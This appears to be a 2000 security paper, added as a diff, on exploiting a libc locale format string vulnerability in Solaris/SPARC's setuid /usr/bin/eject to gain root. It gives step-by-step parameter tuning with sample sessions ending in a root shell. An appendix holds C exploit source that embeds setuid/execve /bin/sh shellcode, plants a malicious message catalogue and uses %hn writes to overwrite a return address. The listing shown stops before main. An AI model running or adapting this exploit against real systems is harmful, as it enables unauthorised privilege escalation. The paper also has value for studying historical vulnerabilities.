@@ -1,0 +1,801 @@
+
+
+                      ----/ Exploiting the Libc Locale Subsystem Format String
+                            Vulnerability on Solaris/SPARC
+
+---/ 10/10/2000
+
+-/ Solar Eclipse <solareclipse@phreedom.org>
+
+
+---/ I. Introduction
+
+This paper describes in detail the exploitation of the libc locale format strin
+g
+vulnerability on Solaris/SPARC. The full source code for the exploit is
+presented and some details of the implementation are discussed. The exploit cod
+e
+is based on the locale subsystem format bug exploit by Warning3 [3].
+
+Tim Newsham's Format String Attacks paper [1] is a very good description of the
+format string attack. You should also be familiar with buffer overflow attacks,
+discussed thoroughly in Smashing The Stack For Fun And Profit [2] by Aleph One.
+The abovementioned two papers are a must-read for every security professional.
+
+
+---/ II. The SPARC Architecure and Procedure Calls
+
+For those who are not familiar with the SPARC processor architecture, the
+Technical SPARC CPU Resources webpage [4] contains links to some very good
+resources and is definitely worth visiting. A very good introduction to the
+SPARC architecture and assembly language programming for Solaris can be found i
+n
+[5].
+
+An example for Solaris/SPARC shell code is given in Smashing the Stack for Fun
+and Profit. Solaris 2.6 provides a non-executable stack protection
+(noexec_user_stack in /etc/system) which can be easily defeated. For more
+information refer to Defeating Solaris/SPARC Non-Executable Stack Protection by
+John McDonald [6].
+
+Overwriting the return address of a function is the most commpnly used exploit
+technique. Therefore it is very important to understand how the SPARC
+architecture handles procedure calls.
+
+Information about the stack on Solaris is available in [6] and [7].  The
+Solaris/SPART Application Binary Interface specification [8] is another
+invaluable source of information and a must-read for everybody doing serious
+work on Solaris.
+
+
+---/ III. Exploiting the Vulnerability Step by Step
+
+The source code for the exploit is given in Appendix B. It has been successfull
+y
+compiled on Solaris 2.6 and 7 with the GNU C compiler.
+
+Most format string exploits require the attacker to specify a couple of system
+specific values, such as the return address location and the align of the shell
+code. Hourlong tracing of the vulnerable program execution with gdb is often th
+e
+only way to get the correct values for these parameters.  The exploit presented
+in this paper provides assistance in guessing these parameters. This allows the
+attacker to fully automate the exploitation of the vulnerability through a Perl
+wrapper.
+
+The exploit can be run in 3 different modes. The 'dump' mode generates a stack
+dump, which allows the attacker to determine the values for the --num and the
+--align parameters. The 'shell' mode prints a string located at an
+user-specified location in memory, thus allowing the attacker to adjust the
+value of the --shellofs parameter. The --retlocofs parameter is the only
+parameter that can not be easily guessed, but it can be brute-forced by using
+the 'exploit' mode.
+
+Here is a sample session of running the exploit on Solaris 2.6. Detailed
+explanation of what's going on is provided.
+
+        $ gcc -o solaris_libc solaris_libc.c 
+        $ ./solaris_libc 
+        Usage:
+            ./solaris_libc [command] [options]
+        
+        Commands:
+          dump                   Dumps the stack
+          shell                  Dumps the shell buffer
+          exploit                Exploits /usr/bin/eject
+        
+        Options:
+          --num=96               Number of words to dump from the stack
+          --align=2              Sets the alignment (0, 1, 2 or 3)
+          --shellofs=-6          Offset of the shell buffer
+          --retlocofs=-4         Retloc adjustment (must be divisible by 4)
+          --retloc=0xeffffa3c    Location of the return address
+
+This --retloc option was used for debugging purposes. By setting it to
+0xfffffff0 or a similar value the hacker can cause a Bus Error when the return
+address is overwritten. This can be used as a gdb breakpoint. 
+
+---/ Step 1 : Determine the values of --num and --align
+
+First the attacker needs to get the correct values of the --num and the --align
+parameters.  This can be accomplished by running the exploit with some nice
+round numbers as parameters and inspecting the resulting stack dump.
+
+        $ ./solaris_libc dump --num=100 --align=2
+        Calculated shell buffer address: 0xeffffbd1
+        Warning: sh_addr + align must be word aligned. Adjust shellofs and alig
+n as neccessary
+        Calculated retloc: 0xeffffa33
+        Calculated shell code jump location: 0xeffffc13
+        
+        Stack dump mode, dumping 100 words
+        num: 100                align: 2        shellofs: -6    retlocofs: -16 
+ retloc: 0xeffffa33
+        
+        /usr/bin/eject: illegal option -- x
+        effffbb47efefeff0000000200ff0000ef727968effffbb400000000000000000000000
+0000000000000000000000000ef7e
+        f4cc00000002effffb240001252000022e0c0000000000000000effffac000011178000
+00003effffb2400000004effffb30
+        00000005effffb3c000000000000000000000002effffb24effffb3000022c000000000
+00000000000000000000000000000
+        00000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000
+        00000000000000000000000000000002effffbb4effffbc300000000effffbc6effffbd
+100000000000007d8efffffd10000
+        07deefffffe700000003000100340000000400000020000000050000000500000009000
+1109c00000007ef7c000000000008
+        000003000000000600002000000007d000000000000007d100001f0d000007d2000000c
+9000007d3000000c9000007d90000
+        000700000000000000002f7573722f62696e2f656a656374002d78004e4c53504154483
+d3a2e00414142424242effffa3342
+        options:        -f force eject
+                        -n show nicknames
+                        -d show default device
+                        -q query for media present
+                        -p do not call eject_popup
+
+The exploit puts the shell code in the environment of /usr/bin/eject before
+calling it. The 'dump' option specifies a format string that consists of num
+'%.8x' format specifies. This makes printf() dump num values from the stack,
+starting from the top of the stack. When /usr/bin/eject calls the printf
+the stack looks like this:
+
+top of the stack
+...                 <- N words
+process arguments
+process environment <- shellcode
+bottom of the stack
+
+We can see the beginning of the shellcode in the stack dump. It looks like this
+:
+(refer to the code in Appendix B to see how the shellcode is generated)
+
+4141 42424242 effffa33 42424242
+^    ^        ^        ^
+|    |        |        |--- always 0x42424242
+|    |        |       
+|    |        |--- retloc
+|    |
+|    |--- always 0x42424242
+|
+|--- alignment padding with 'A' (0x41) bytes
+
+The number of the 0x41 bytes is specified by the --align parameter. The --num
+parameter specifies how many words should be dumped from the stack.  The goal i
+s
+to get --num equal to N, the number of the words betwwen the top of the stack
+and the first 0x42424242 value in the shellcode. The attacker can determine thi
+s
+number by counting the words in the stack dump or by making --num smaller and
+smaller until it reaches N.
+
+The align needs to be adjusted to make the 0x42424242 value be word aligned.  I
+n
+this example --align should be set to 3.
+
+        $ ./solaris_libc dump --num=99 --align=3
+        Calculated shell buffer address: 0xeffffbd1
+        Calculated retloc: 0xeffffa38
+        Calculated shell code jump location: 0xeffffc14
+        
+        Stack dump mode, dumping 99 words
+        num: 99         align: 3        shellofs: -6    retlocofs: -16  retloc:
+ 0xeffffa38
+        
+        /usr/bin/eject: illegal option -- x
+        effffbb47efefeff0000000200ff0000ef727968effffbb400000000000000000000000
+0000000000000000000000000ef7e
+        f4cc00000002effffb240001252000022e0c0000000000000000effffac000011178000
+00003effffb2400000004effffb30
+        00000005effffb3c000000000000000000000002effffb24effffb3000022c000000000
+00000000000000000000000000000
+        00000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000
+        00000000000000000000000000000002effffbb4effffbc300000000effffbc6effffbd
+100000000000007d8efffffd10000
+        07deefffffe700000003000100340000000400000020000000050000000500000009000
+1109c00000007ef7c000000000008
+        000003000000000600002000000007d000000000000007d100001f0d000007d2000000c
+9000007d3000000c9000007d90000
+        000700000000000000002f7573722f62696e2f656a656374002d78004e4c53504154483
+d3a2e0041414142424242
+        options:        -f force eject
+                        -n show nicknames
+                        -d show default device
+                        -q query for media present
+                        -p do not call eject_popup
+
+The 0x42424242 value is properly aligned with --align=3. The --num parameter
+should be set to 98 to get the stack dump stop before it reaches this value. Th
+e
+attacker has two of the parameters set right and it's time for the next step.
+
+---/ Step 2 : Determine the value of --shellofs
+
+The exact address of the shell code in the process'es environment has to be
+determined. The exploit code tries to guess it, but it is usually off by some
+small value. That's why the attacker runs exploit with the 'shell' option to ge
+t
+a dump of the shell code from the process environment.
+
+        $ ./solaris_libc shell --num=98 --align=3 --shellofs=0
+        Calculated shell buffer address: 0xeffffbd7
+        Warning: sh_addr + align must be word aligned. Adjust shellofs and alig
+n as neccessary
+        Calculated retloc: 0xeffffa42
+        Calculated shell code jump location: 0xeffffc1a
+        
+        shellbuf (length = 1024): AAAïÿû×ïÿúBBBBBïÿúD¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+        ¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+        n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+        ¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+        ¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+        n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+        ¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+        ¡n¬¡n¬¡n¬¡?ÿ Ðª@`   ` >Ð Is ba se :)DTÿÿÿ
+        à4Ð#¿øÀ#¿üÀ*  ;Ð Ð/bin/shÿAAAA
+        
+        Shell buffer dump mode, shell buffer address is 0xeffffbd7
+        num: 98         align: 3        shellofs: 0     retlocofs: -16  retloc:
+ 0xeffffa42
+        
+        /usr/bin/eject: illegal option -- x
+        effffbb47efefeff0000000200ff0000ef727968effffbb400000000000000000000000
+0000000000000000000000000ef7e
+        f4cc00000002effffb240001252000022e0c0000000000000000effffac000011178000
+00003effffb2400000004effffb30
+        00000005effffb3c000000000000000000000002effffb24effffb3000022c000000000
+00000000000000000000000000000
+        00000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000
+        00000000000000000000000000000002effffbb4effffbc300000000effffbc6effffbd
+100000000000007d8efffffd10000
+        07deefffffe700000003000100340000000400000020000000050000000500000009000
+1109c00000007ef7c000000000008
+        000003000000000600002000000007d000000000000007d100001f0d000007d2000000c
+9000007d3000000c9000007d90000
+        000700000000000000002f7573722f62696e2f656a656374002d78004e4c53504154483
+d3a2e00414141 Shell buffer: ×
+        ïÿúBBBBBïÿúD¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+        ¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+        n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+        ¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+        ¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+        n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+        ¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡?ÿ Ðª@`    ` >Ð Is ba s
+        e :)DTÿÿÿ
+        à4Ð#¿øÀ#¿üÀ*  ;Ð Ð/bin/shÿAAAA
+        options:        -f force eject
+                        -n show nicknames
+                        -d show default device
+                        -q query for media present
+                        -p do not call eject_popup
+
+When run with the 'shell' option the exploit prints the shell code before
+/usr/bin/eject is executed. Then it appends " Shell buffer %s" to the end of
+the format string. This causes printf() to read an address from the stack and
+print out the string located at this address.  If the correct values for --num
+and --align are used, this address will contain the first 0x42424242 word from
+the shell code. When the 'shell' option is used, the exploit overwrites
+0x42424242 with the guessed shell code address. The end result is that printf()
+prints out the shell code.  Usually the guess for the shell code's address will
+be off by some small number and the attacker would use the --shellofs option to
+adjust it.
+
+        $ ./solaris_libc shell --num=98 --align=3 --shellofs=-6
+        Calculated shell buffer address: 0xeffffbd1
+        Calculated retloc: 0xeffffa3c
+        Calculated shell code jump location: 0xeffffc14
+        
+        shellbuf (length = 1024): AAAïÿûÑïÿú<BBBBïÿú>¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+        ¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+        n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+        ¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+        ¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+        n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+        ¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+        ¡n¬¡n¬¡n¬¡?ÿ Ðª@`   ` >Ð Is ba se :)DTÿÿÿ
+        à4Ð#¿øÀ#¿üÀ*  ;Ð Ð/bin/shÿAAAA
+        
+        Shell buffer dump mode, shell buffer address is 0xeffffbd1
+        num: 98         align: 3        shellofs: -6    retlocofs: -16  retloc:
+ 0xeffffa3c
+        
+        /usr/bin/eject: illegal option -- x
+        effffbb47efefeff0000000200ff0000ef727968effffbb400000000000000000000000
+0000000000000000000000000ef7e
+        f4cc00000002effffb240001252000022e0c0000000000000000effffac000011178000
+00003effffb2400000004effffb30
+        00000005effffb3c000000000000000000000002effffb24effffb3000022c000000000
+00000000000000000000000000000
+        00000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000
+        00000000000000000000000000000002effffbb4effffbc300000000effffbc6effffbd
+100000000000007d8efffffd10000
+        07deefffffe700000003000100340000000400000020000000050000000500000009000
+1109c00000007ef7c000000000008
+        000003000000000600002000000007d000000000000007d100001f0d000007d2000000c
+9000007d3000000c9000007d90000
+        000700000000000000002f7573722f62696e2f656a656374002d78004e4c53504154483
+d3a2e00414141 Shell buffer: A
+        AAïÿûÑïÿú<BBBBïÿú>¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+        ¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+        n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+        ¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+        ¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+        n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬
+¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n
+        ¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡n¬¡
+n¬¡n¬¡n¬¡n¬¡?ÿ Ðª@`      ` >Ð
+        Is ba se :)DTÿÿÿ
+        à4Ð#¿øÀ#¿üÀ*  ;Ð Ð/bin/shÿAAAA
+        options:        -f force eject
+                        -n show nicknames
+                        -d show default device
+                        -q query for media present
+                        -p do not call eject_popup
+
+By setting --shellofs to -6 the correct address of the shell code is found. In
+this example it is 0xeffffbd1. Now it is time to use the 'exploit' option.
+
+---/ Step 3 : Determine the value of --retlocofs and get root
+
+When called with the 'exploit' option, the exploit appends two %hn format
+specifiers to the format string, causing an arbitrary memory location to be
+overwritten with a user-supplied value. For more information about this refer t
+o
+[1]. In this case the exploit will overwrite a return address on the stack with
+the shell code jump address (the shell code jump address is equal to the
+beginning of the shell code + 64).  Guassing the correct return address locatio
+n
+is not easy. The exploit calculates the address of the first word in the stack
+dump. Then the value of --retlocofs is added to to this address and the
+resulting address is overwritten with the shell code jump address. Unfortunatel
+y
+it's impossible to determine the correct --retlocofs, but the attacker can run
+the exploit multiple times with different values until he gets a root prompt.
+
+        $ ./solaris_libc exploit --num=98 --align=3 --shellofs=-6 --retlocofs=-
+16
+        Calculated shell buffer address: 0xeffffbd1
+        Calculated retloc: 0xeffffa3c
+        Calculated shell code jump location: 0xeffffc14
+        
+        Exploit mode, jumping to 0xeffffc14
+        num: 98         align: 3        shellofs: -6    retlocofs: -16  retloc:
+ 0xeffffa3c
+        
+        /usr/bin/eject: illegal option -- x
+        effffbb47efefeff0000000200ff0000ef727968effffbb400000000000000000000000
+0000000000000000000000000ef7e
+        f4cc00000002effffb240001252000022e0c0000000000000000effffac000011178000
+00003effffb2400000004effffb30
+        00000005effffb3c000000000000000000000002effffb24effffb3000022c000000000
+00000000000000000000000000000
+        00000000000000000000000000000000000000000000000000000000000000000000000
+00000000000000000000000000000
+        00000000000000000000000000000002effffbb4effffbc300000000effffbc6effffbd
+100000000000007d8efffffd10000
+        07deefffffe700000003000100340000000400000020000000050000000500000009000
+1109c00000007ef7c000000000008
+        000003000000000600002000000007d000000000000007d100001f0d000007d2000000c
+9000007d3000000c9000007d90000
+        000700000000000000002f7573722f62696e2f656a656374002d78004e4c53504154483
+d3a2e00414141
+        
+        
+                                                                      B
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+                                                     B
+        options:        -f force eject
+                        -n show nicknames
+                        -d show default device
+                        -q query for media present
+                        -p do not call eject_popup
+        #
+
+After running the exploit a couple of times with different retlocofs values, th
+e
+attacker gets a root prompt.
+
+
+---/ Appendix A: References
+
+[1] Format String Attacks by Tim Newsham
+    http://www.guardent.com/rd_whtpr.html
+
+[2] Smashing The Stack For Fun And Profit by Aleph One
+    http://www.securityfocus.com/data/library/P49-14.txt
+
+[3] /usr/bin/eject locale subsystem exploit for Solaris 2.x by Warning3
+    http://packetstorm.securify.com/0009-exploits/eject.locale.c
+
+[4] Technical SPARC CPU Resources by Bruce Ediger
+    http://www.csn.net/~bediger/sparc.tech.links.html
+
+[5] An introduction to SPARC assembly by +Spath
+    Assembly Programming Journal Issue 3
+    http://asmjournal.freeservers.com/issues/apj_3.txt
+
+[6] Defeating Solaris/SPARC Non-Executable Stack Protection by John McDonald
+    http://lists.insecure.org/bugtraq/1999/Mar/0004.html
+
+[7] Understanding stacks and registers in the Sparc architecture
+    by Peter Magnusson
+    http://www.sics.se/~psm/sparcstack.html
+
+[8] SPARC Application Binary Interface
+    http://www.sparc.com/standards/psABI3rd.pdf
+
+[9] Locale Format String Vulnerabilities in Multiple UNIXes
+    http://www.pulhas.org/xploitsdb/mUNIXes/format3.html
+
+
+---/ Appendix B: Exploit Code
+
+/* Exploit for the locale format string vulnerability in Solaris/SPARC
+   Based on the exploit by Warning3 <warning3@nsfocus.com>
+   
+   For additional information see http://www.phreedom.org/solar/locale_sol.txt
+      
+   By Solar Eclipse <solareclipse@phreedom.org>
+   Assistant Editor,
+   Phreedom Magazine
+   http://www.phreedom.org
+
+   10 Oct 2000
+*/
+
+#include <stdio.h>
+#include <sys/systeminfo.h>
+
+#define NUM     98          /* default number of words to dump from the stack *
+/
+#define ALIGN   3           /* default align (can be 0, 1, 2, 3) */
+#define RETLOCOFS -16       /* default offset of the return address location */
+#define SHELLOFS -6         /* default offset of the jump location from the beg
+inning of the shell buffer */
+#define RETLOC  0xfffffffd
+
+#define PATTERN 1024        /* format string buffer size */
+#define SHELL   1024        /* shell buffer size */
+
+#define NOP     0xac15a16e
+
+#define VULPROG "_usr_bin_eject"
+
+char shellcode[] =      /* from scz's funny shellcode for SPARC */
+    "\x90\x08\x3f\xff\x82\x10\x20\x17\x91\xd0\x20\x08"  /* setuid(0)  */
+    "\xaa\x1d\x40\x15\x90\x05\x60\x01\x92\x10\x20\x09"  /* dup2(1,2)  */
+    "\x94\x05\x60\x02\x82\x10\x20\x3e\x91\xd0\x20\x08"
+    "\x20\x80\x49\x73\x20\x80\x62\x61\x20\x80\x73\x65\x20\x80\x3a\x29"
+    "\x7f\xff\xff\xff\x94\x1a\x80\x0a\x90\x03\xe0\x34\x92\x0b\x80\x0e"
+    "\x9c\x03\xa0\x08\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc\xc0\x2a\x20\x07"
+    "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
+    "\x91\xd0\x20\x08\x2f\x62\x69\x6e\x2f\x73\x68\xff";
+
+/* get current stack point address */
+
+long get_sp(void)
+{
+    __asm__("mov %sp,%i0");
+}
+
+/* prints a long to a string */
+
+char* put_long(char* ptr, long value)
+{
+    *ptr++ = (char) (value >> 24) & 0xff;
+    *ptr++ = (char) (value >> 16) & 0xff;
+    *ptr++ = (char) (value >> 8) & 0xff;
+    *ptr++ = (char) (value >> 0) & 0xff;
+
+    return ptr;
+}
+
+/* check if a long contains zero bytes */
+
+int contains_zero(long value)
+{
+    return !((value & 0x00ffffff) &&
+             (value & 0xff00ffff) &&
+             (value & 0xffff00ff) &&
+             (value & 0xffffff00));
+    
+}
+
+/* create the shell buffer */
+
+void create_shellbuf(char* shellbuf, int align, int retloc)
+{
+    char *ptr;
+    int i;
+    
+    /* check align parameter */
+    
+    if (align < 0 || align > 3) {
+        printf("Error: align is %d, it should be between 0 and 3\n", align);
+        exit(1);
+    }
+
+    /* check retloc parameter */
+    
+    if (contains_zero(retloc) || contains_zero(retloc+2) ) {
+        printf("Error: retloc (0x%x) or retloc+2 (0x%x) contains a zero byte\n"
+, retloc, retloc+2);
+        exit(1);
+    }
+
+    /* start constructing the shell buffer */
+    
+    ptr = shellbuf;
+    
+    for (i = 0; i < align; i++) {
+        *ptr++ = 0x41;      /* alignment padding */
+    }
+
+    ptr = put_long(ptr, 0x42424242);        /* this is used by the %u format sp
+ecifier */
+    
+    ptr = put_long(ptr, retloc);            /* put the address of the low order
+ half-word of the return
+                                               address on the stack */
+
+    ptr = put_long(ptr, 0x42424242);        /* this is used by the %u format sp
+ecifier */
+    
+    ptr = put_long(ptr, retloc + 2);        /* put the address of the high orde
+r half-word of the
+                                               return address on the stack */
+
+    /* fill the shellbuf with NOP instructions but leave enough space for the s
+hell code */
+    
+    while ((long)ptr + 4 + strlen(shellcode) + 1 < (long)shellbuf + SHELL) {
+        ptr = put_long(ptr, NOP);
+    }
+
+    memcpy(ptr, shellcode, strlen(shellcode));      /* copy the shellcode */
+    ptr = ptr + strlen(shellcode);
+
+    /* add additional padding to the shell buffer to make sure its size is alwa
+ys the same */
+    
+    while ((long)ptr < (long)shellbuf + SHELL - 1) {
+        *ptr++ = 0x41;
+    }
+
+    *ptr = 0;                               /* null-terminate */
+
+    /* at this point the shell buffer should be exactly SHELL bytes long, inclu
+ding the null-terminator */
+
+    if (strlen(shellbuf) + 1 != SHELL) {
+        printf("Error: The shell buffer is %d bytes long. It should be %d bytes
+. Something went terribly wrong...\n",
+                strlen(shellbuf)+1, SHELL);
+        exit(1);
+    }
+
+    return;
+}
+
+/* execute the vulnerable program using our custom environment */
+
+void execute_vulnprog(char* pattern, char* shellbuf)
+{
+    char *env[3];
+    FILE *fp;
+    
+    /* create message files */
+    
+    if (strlen(pattern) > 512) {
+        printf("Warning: The pattern is %d bytes long. Only the first 512 bytes
+ will be used.\n", strlen(pattern));
+    }
+    
+    if ( !(fp = fopen("messages.po", "w+")) ) {
+        perror("Error openning messages.po for writing.");
+        exit(1);
+    }
+
+    fprintf(fp, "domain \"messages\"\n");
+    fprintf(fp, "msgid  \"usage: %%s [-fndq] [name | nickname]\\n\"\n");
+    fprintf(fp, "msgstr \"%s\\n\"", pattern);
+    fclose(fp);
+
+    system("/usr/bin/msgfmt messages.po");
+    system("cp messages.mo SUNW_OST_OSCMD");
+    system("cp messages.mo SUNW_OST_OSLIB");
+
+    /* prepere the environment for the VULNPROG process */
+
+    env[0] = "NLSPATH=:.";
+    env[1] = shellbuf;              /* put the shellbuf in env */
+    env[2] = NULL;                  /* end of env */
+
+    /* execute the vulnerable program using our custom environment */
+    
+    execle(VULPROG, VULPROG, "-x", NULL, env);
+}
+
+
+/* print the program usage */
+
+void usage(char *prg)
+{
+    printf("Usage:\n");
+    printf("    %s [command] [options]\n\n", prg);
+    printf("Commands:\n");
+    printf("  dump                   Dumps the stack\n");
+    printf("  shell                  Dumps the shell buffer\n");
+    printf("  exploit                Exploits /usr/bin/eject\n\n");
+    printf("Options:\n");
+    printf("  --num=96               Number of words to dump from the stack\n")
+;
+    printf("  --align=2              Sets the alignment (0, 1, 2 or 3)\n");
+    printf("  --shellofs=-6          Offset of the shell buffer\n");
+    printf("  --retlocofs=-4         Retloc adjustment (must be divisible by 4)
+\n");
+    printf("  --retloc=0xeffffa3c    Location of the return address\n");
+
+    exit(0);
+}
+
+/* main */
+
